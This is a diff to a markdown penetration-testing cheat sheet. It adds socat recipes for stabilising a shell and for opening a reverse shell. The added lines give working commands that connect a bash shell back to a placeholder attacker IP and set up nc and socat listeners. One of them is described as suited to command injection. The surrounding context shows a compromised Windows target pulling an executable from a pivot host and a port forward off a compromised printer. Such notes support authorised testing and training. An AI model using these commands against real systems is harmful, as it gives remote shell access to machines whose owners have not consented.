@@ -115,6 +115,31 @@ Then from the Windows target:
 invoke-webrequest -usebasicparsing -uri http://PIVOT_IP:8000/tool.exe -o tool.exe
 ```
 
+---
+
+### Shell Stabilization with Socat
+
+```bash
+# 1. Get initial callback to nc listener
+nc -nlvp 8443
+
+# 2. Start socat listener for stable shell
+socat file:`tty`,raw,echo=0 tcp-listen:4443
+
+# 3. From initial shell, connect back with full PTY
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:4443
+```
+
+### Socat as Reverse Shell
+
+Useful for command injection with few special chars:
+
+```bash
+socat TCP4:<attacker_ip>:8443 EXEC:bash
+```
+
+---
+
 ### Socat Forward Port off Printer or non ssh enabled device
 
 * Have a compromised device that is running `cupsd` port 631, however its listening only on the loopback and the printer does not have ssh.
